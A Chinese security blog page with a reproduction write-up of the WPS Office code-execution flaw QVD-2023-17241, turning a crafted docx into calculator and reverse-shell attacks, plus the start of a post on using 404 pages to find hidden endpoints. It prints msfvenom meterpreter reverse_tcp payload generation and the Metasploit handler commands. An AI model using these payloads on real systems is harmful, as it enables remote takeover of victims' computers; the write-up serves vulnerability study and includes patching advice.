<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cgw-f.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="北极星上的稻草人">
<meta property="og:url" content="https://cgw-f.github.io/index.html">
<meta property="og:site_name" content="北极星上的稻草人">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="北极星上的稻草人">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cgw-f.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>北极星上的稻草人</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">北极星上的稻草人</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">稻草人笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">85</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/" class="post-title-link" itemprop="url">WPS-Office代码执行漏洞（QVD-2023-17241）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-17 11:48:06 / 修改时间：15:13:35" itemprop="dateCreated datePublished" datetime="2023-08-17T11:48:06+08:00">2023-08-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2023HW-0day-WPS-Office-代码执行漏洞-QVD-2023-17241-复现与分析"><a href="#2023HW-0day-WPS-Office-代码执行漏洞-QVD-2023-17241-复现与分析" class="headerlink" title="2023HW 0day|WPS Office 代码执行漏洞(QVD-2023-17241)复现与分析"></a>2023HW 0day|WPS Office 代码执行漏洞(QVD-2023-17241)复现与分析</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong></p>
<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><p>【威胁类型】：代码执行漏洞</p>
<p>【类型】：数据验证不恰当</p>
<p><strong>漏洞描述</strong>:：WPS Office for windows 的内置浏览器存在逻辑漏洞，攻击者可以利用该漏洞专门构造出恶意文档，受害者打开该文档并点击文档中的 URL 链接或包含了超级链接的图片时，存在漏洞版本的 WPS office 会通过内浏览器加载该链接，接着该链接中 js 脚本会通过 cefQucry 调用 WPS 端内 API下载文件并打开文件，进而导致恶意文件在受害者电脑上被运行。</p>
<h2 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h2><p>WPS Office 2023个人版 &lt; =11.1.0.15120</p>
<p>WPS Office 2019企业版 &lt; =11.8.2.12085</p>
<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>​        比较靠谱解释是：在docx文档中嵌入一个远程链接，当使用wps去打开文档时会去请求这个链接，由于WPS内部浏览器存在漏洞，会调用系统的api去执行攻击者在html中构造的恶意代码从而导致RCE。</p>
<p><strong>漏洞执行的流程是</strong>：</p>
<p>当受害者用wps打开伪造的恶意文件<strong>poc.docx</strong>时，poc.docx的<strong>webExtension1.xm</strong>l文件就会被执行，然后访问<strong><a target="_blank" rel="noopener" href="http://clientweb.docer.wps.cn.cloudwps.cn/1.html">http://clientweb.docer.wps.cn.cloudwps.cn/1.html</a></strong>下载<strong>1.html</strong>恶意文件；然后系统就会执行1.html的<strong>shellcode</strong>变量的恶意命令执行代码，如网上poc的打开计算器、还有getshell命令等。</p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145114731.png" alt="image-20230817145114731"></p>
<h3 id="恶意文件介绍"><a href="#恶意文件介绍" class="headerlink" title="恶意文件介绍"></a>恶意文件介绍</h3><p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145138543.png" alt="image-20230817145138543"></p>
<ul>
<li><p><strong>恶意文件1：poc.docx</strong></p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145204179.png" alt="image-20230817145204179"></p>
</li>
</ul>
<p>​        虽然改文件是.docx后缀，其真实文件类型是.zip，而该压缩文件包含多个文件。利用压缩软件打开poc.docx就能看到其“庐山真面目”，如下</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145213609.png" alt="image-20230817145213609"></p>
<p>注意：不能直接右键 ⟶ 添加到压缩文件，也不能直接把文件拉到软件图标打开</p>
<p><strong>打开方式1</strong>：右键 ⟶ 打开方式 ⟶ 找到自己的压缩软件打开⟶解压</p>
<p><strong>打开方式2</strong>：先打开压缩软件，再在软件翻找到poc.docx，双击打开⟶解压</p>
<p><strong>WebExtension1.xml</strong></p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145439950.png" alt="image-20230817145439950"></p>
<p>​        用压缩软件打开poc.docx后，到..\poc\poc\word\webExtensions目录下可以看到webExtension1.xml文件，该文件绑定了访问恶意服务器的域名，即写了（访问）下载恶意文件的链接（<strong>红框部分</strong>）。当受害者用wps打开poc.docx时，其电脑就会访问<a target="_blank" rel="noopener" href="http://clientweb.docer.wps.cn.cloudwps.cn/1.html%E4%B8%8B%E8%BD%BD**1.html**%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82">http://clientweb.docer.wps.cn.cloudwps.cn/1.html下载**1.html**恶意文件。</a></p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145457736.png" alt="image-20230817145457736"></p>
<ul>
<li><strong>恶意文件2：1.html</strong></li>
</ul>
<p>​        1.html是执行恶意命令的文件。其中执行的恶意代码，保存在<strong>shellcode</strong>变量中。</p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145549126.png" alt="image-20230817145549126"></p>
<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><p>漏洞复现WPS Office版本：11.1.0.12300-release</p>
<p><strong>注意</strong>：即使有的WPS有这个漏洞，但是复现的windows系统不同，复现结果也是不一样的。</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145616058.png" alt="image-20230817145616058"></p>
<h3 id="POC复现"><a href="#POC复现" class="headerlink" title="POC复现"></a>POC复现</h3><ul>
<li><strong>效果</strong>：在本地弹出计算器</li>
</ul>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817145710285.png" alt="image-20230817145710285"></p>
<ul>
<li><strong>步骤1：域名绑定</strong></li>
</ul>
<p>​        编辑C:\Windows\System32\drivers\etc\hosts文件，将域名clientweb.docer.wps.cn.cloudwps.cn绑定到本地127.0.0.1。（**这里是以本地搭建恶意服务器）</p>
<p><font color="red"><strong>疑问：黑客不可能自己到靶机上修改host文件吧，那他是如何利用的呢？</strong></font> </p>
<p><strong>网上一些回答：</strong>在docx文档中嵌入一个远程链接，当使用wps去打开文档时会去请求这个链接，由于WPS内部浏览器存在漏洞，会调用系统的api去执行攻击者在html中构造的恶意代码从而导致RCE。</p>
<p><strong>个人猜想：</strong>由于漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。<strong>那么黑客实际应用时，是否可以不用执行该一步？他可以自己搭建恶意服务器，在poc.docx的WebExtension1.xml放上自己的恶意服务器即可.</strong></p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150027757.png" alt="image-20230817150027757"></p>
<ul>
<li><strong>步骤2：启动的http服务</strong></li>
</ul>
<p>**方式1:**在1.html所在目录下用python起一个http服务</p>
<p>l  <strong>python -m http.server 80                     # python3版本使用</strong></p>
<p>l  <strong>python -m SimpleHTTPServer 80         #python2版本使用</strong></p>
<p>​        如果开启80端口报错（如下图. 用80端口启动报错），可能是因为80端口被占用所导致的，可以开启其他端口，如8080端口（图. 用8080端口启动）。</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150235426.png" alt="image-20230817150235426"></p>
<p>图. 用80端口启动报错</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150250866.png" alt="image-20230817150250866"></p>
<p>图. 用8080端口启动</p>
<p>注意，如果使用其他端口启动，需要修改webExtension1.xml文件</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150302863.png" alt="image-20230817150302863"></p>
<p><strong>方式2：</strong></p>
<p>把poc放进PhpStudy的环境里面，但一定是根目录，然后启动PhpStudy。</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150324698.png" alt="image-20230817150324698"></p>
<ul>
<li><strong>步骤3：执行poc</strong></li>
</ul>
<p>用wps打开poc.docx</p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150350250.png" alt="image-20230817150350250"> </p>
<h3 id="EXP：利用CS进行getshell"><a href="#EXP：利用CS进行getshell" class="headerlink" title="EXP：利用CS进行getshell"></a>EXP：利用CS进行getshell</h3><p><strong>【环境】</strong></p>
<p>Kail：（eth0）192.168.91.128</p>
<p>Window10：（Ethernet0）192.168.91.129</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150409683.png" alt="image-20230817150409683"></p>
<ul>
<li><strong>步骤1：绑定域名</strong></li>
</ul>
<p>将域名绑定kali的ip。</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150447734.png" alt="image-20230817150447734"></p>
<ul>
<li><strong>步骤2：构造poc.docx</strong></li>
</ul>
<p>​        解压poc.docx，然后找到\word\webExtensions\webExtensions1.xml，修改其中的url，这里用8080端口，避免与80端口的服务碰撞。</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150515910.png" alt="image-20230817150515910"></p>
<p>​        保存后再将解压出来的文件重新打包成poc.zip，并修改后缀为docx，得到新的poc.docx。</p>
<ul>
<li><strong>步骤3：构造1.html</strong></li>
</ul>
<p>l  CS创建一个监听器</p>
<p><img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150608919.png" alt="image-20230817150608919"></p>
<p>l  <strong>生成一个C#的payload</strong></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150623140.png" alt="image-20230817150623140"></p>
<p>l  将payload内容写入到1.html的shellcode变量里，得到新的1.html文件，1.html要放到kali里。</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150647067.png" alt="image-20230817150647067"></p>
<ul>
<li><strong>步骤4：启动http服务</strong></li>
</ul>
<p>​        在kali的1.html目录下用python启动http服务<code>python -m http.server 8080</code></p>
<ul>
<li><strong>步骤5：反弹shell</strong></li>
</ul>
<p>l <strong>Win10打开新的poc.docx</strong></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150804168.png" alt="image-20230817150804168"></p>
<p>l <strong>Kali**</strong>接收到请求服务**</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150821773.png" alt="image-20230817150821773"></p>
<p>l <strong>win系统上线CS</strong></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150845091.png" alt="image-20230817150845091"></p>
<h3 id="EXP：利用MSF进行getshell"><a href="#EXP：利用MSF进行getshell" class="headerlink" title="EXP：利用MSF进行getshell"></a>EXP：利用MSF进行getshell</h3><p><strong>！！注意：其他文件复用 “EXP：利用CS进行getshell”的文件。</strong></p>
<p><strong>步骤1：构造1.html</strong></p>
<p>l MSF生成一个C#后门</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.91.128 LPORT=4444 -f csharp &gt; shellcode.cs</code></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150940143.png" alt="image-20230817150940143"></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150952512.png" alt="image-20230817150952512"></p>
<p>l 将shellcode.cs的变量值（红框）替换到1.html的shellcode值</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151009031.png" alt="image-20230817151009031"></p>
<p>替换1.html的shellcode值</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151024917.png" alt="image-20230817151024917"></p>
<ul>
<li><strong>步骤2：MSF设置exploit并监听</strong></li>
</ul>
<p><code># msfconsole</code></p>
<p><code>msf6 &gt; use exploit/multi/handler</code></p>
<p><code>msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</code></p>
<p><code>msf6 exploit(multi/handler) &gt; set lhost 192.168.91.128</code></p>
<p><code>msf6 exploit(multi/handler) &gt; set lport 4444</code></p>
<p><code>msf6 exploit(multi/handler) &gt; run</code></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151117209.png" alt="image-20230817151117209"></p>
<p><strong>步骤3：启动http服务用来捕获请求</strong></p>
<p><code>python3 -m http.server 8080</code></p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151137873.png" alt="image-20230817151137873"></p>
<p><strong>步骤4：触发shell</strong></p>
<p>l  Win10打开poc.docx</p>
<p>l  Win10请求了Kali上的1.html</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151202701.png" alt="image-20230817151202701"></p>
<p>l  MSF反弹到shell</p>
<p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817151220722.png" alt="image-20230817151220722"></p>
<h3 id="0x05-漏洞修复与防护"><a href="#0x05-漏洞修复与防护" class="headerlink" title="0x05 漏洞修复与防护"></a>0x05 漏洞修复与防护</h3><ul>
<li> <strong>修复</strong></li>
</ul>
<p>1.把WPS升级到最新版本</p>
<p>2.到官网下载补丁进行修复。、官方已发布相关补丁，如果您在使用 WPS office 的企业版请尽快联系官方技术工程师或客服获取最新版本，并确保企业版升级到11.8.2.12085;如果您使用的是 WPS ffice 个人版，请通过 WPS官网 https: //<a target="_blank" rel="noopener" href="http://www.wps.cn/">www.wps.cn</a> 获取最新版本进行升级</p>
<ul>
<li>  <strong>防护</strong></li>
</ul>
<p>1、请不要随意打开 PPS、PPSX、PPT、PPTX、DOC、DOCX、XLSXLSX 文档</p>
<p>2、请勿随意点击 PPS、PPSX、PPT、PPTX、DOC、DOCX、XLS、XLSX文档中的 URL 链接或带 URL 超级链接的图片或视频等</p>
<p>3、如果使用 WPS 打开 PDF 文件，请勿随意点击 PDF 中的 URL 链接或超级链接</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">404页面利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-14 16:25:18 / 修改时间：21:06:45" itemprop="dateCreated datePublished" datetime="2023-08-14T16:25:18+08:00">2023-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="实战-404页面利用"><a href="#实战-404页面利用" class="headerlink" title="实战|404页面利用"></a>实战|404页面利用</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<p><font color="red"><strong>Nginx的404，是实实在在的404，tomcat的404并不是！！！</strong></font></p>
<h2 id="方向1：js代码审计"><a href="#方向1：js代码审计" class="headerlink" title="方向1：js代码审计"></a>方向1：js代码审计</h2><ul>
<li><strong>Tomcat 404</strong></li>
</ul>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814162827923.png" alt="image-20230814162827923"></p>
<ul>
<li><strong>Nginx 404</strong></li>
</ul>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814162852172.png" alt="image-20230814162852172"></p>
<ul>
<li><strong>SpringBoot 404</strong></li>
</ul>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814162927388.png" alt="image-20230814162927388"></p>
<h3 id="实战例子"><a href="#实战例子" class="headerlink" title="实战例子"></a><strong>实战例子</strong></h3><p>着重审计如下两种格式的信息：</p>
<ul>
<li> <strong><a target="_blank" rel="noopener" href="http://xxx.com/xxx">http://xxx.com/xxx</a> 或 <a target="_blank" rel="noopener" href="https://xxx.com/xxx">https://xxx.com/xxx</a></strong></li>
<li><strong>/aaa/bbb</strong></li>
</ul>
<p>第一种为代码可能会远程调用的URL，第二种问系统可能存在的接口地址。</p>
<ul>
<li><strong>步骤1：审计</strong></li>
</ul>
<p>通过如上所述方式，共计提取到了如下几个目录信息：</p>
<p>/data_marxxx</p>
<p>/cloud/user_xxxxx/user/list</p>
<p>/cloud/order/</p>
<p>/process</p>
<p>/process/hanxxx</p>
<p>/process/addCounterxxxxxx</p>
<p>/cloud/asset/authxxxxx/search</p>
<ul>
<li><strong>步骤2：拼接URL访问</strong></li>
</ul>
<p>第一个目录：http://***.com/data_marxxx</p>
<p>发现1个Tomcat404页面</p>
<p> <img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163121603.png" alt="image-20230814163121603"></p>
<p>其余都是Nginx 404</p>
<p><img src="/2023/08/14/404%E9%A1%B5%E9%9D%A2%E5%88%A9%E7%94%A8/image-20230814163144756.png" alt="image-20230814163144756"></p>
<p><strong>情况1</strong>：访问都是nginx的404，但有个404却是Tomcat的404。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/255640.html">https://www.freebuf.com/vuls/255640.html</a></p>
<p><strong>问：</strong>为什么访问/data_marxxx，回显的是Tomcat的404 Not Found而不是Nginx的呢？</p>
<p><strong>答：</strong>这说明/data_marxxx目录是存在的，并且使用Tomcat搭建了SpringBoot接口服务。</p>
<p><strong>问：</strong>但是为什么不是熟悉的SpringBoot报错页面呢？</p>
